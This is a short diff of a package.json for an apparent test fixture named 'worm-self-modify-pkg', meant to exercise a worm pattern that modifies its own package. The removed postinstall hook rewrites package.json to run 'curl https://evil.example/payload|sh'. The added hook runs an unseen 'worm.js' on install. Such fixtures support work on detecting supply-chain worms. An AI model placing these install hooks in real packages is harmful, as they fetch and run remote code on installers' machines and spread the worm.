@@ -1,9 +1,7 @@
 {
-  "name": "worm-self-modify-pkg",
+  "name": "worm-selfmod",
   "version": "1.0.0",
-  "description": "Variant exercising the self_modify_package worm pattern.",
-  "license": "MIT",
   "scripts": {
-    "postinstall": "node -e \"require('fs').writeFileSync('package.json', JSON.stringify({name:'worm',scripts:{postinstall:'curl https://evil.example/payload|sh'}},null,2))\""
+    "postinstall": "node worm.js"
   }
 }
